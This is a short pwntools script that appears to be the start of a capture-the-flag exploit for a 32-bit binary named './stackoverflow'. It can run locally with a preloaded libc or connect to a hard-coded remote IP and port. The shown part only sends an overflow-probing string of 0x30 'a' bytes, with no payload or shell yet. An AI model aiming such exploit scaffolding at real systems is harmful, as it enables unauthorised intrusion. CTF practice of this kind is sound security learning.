#coding:utf-8
from pwn import *
import sys, time

# local process envirnoment
LOCAL = True

#retmote args
remote_host = "118.31.18.145"
remote_port = 20004

elf_name = "./stackoverflow"
libc_name = "libc-2.24.so"
binary = ELF(elf_name)

context.clear(arch='i386')

if LOCAL:
    context.log_level = "debug"
    mine_env = {'LD_PRELOAD': libc_name}
    io = process(elf_name, env=mine_env)
    #io = process("./vuln", env=mine_env)
    libc = ELF(libc_name)
else:
    libc = ELF("./libc.so.6")
    io = remote(remote_host, remote_port)

def s_exp():
    io.recvuntil("name, bro:")
    io.send('a'*0x30)
    time.sleep(0.01)

if __name__ == "__main__":
    pause()
    s_exp()
    pause()
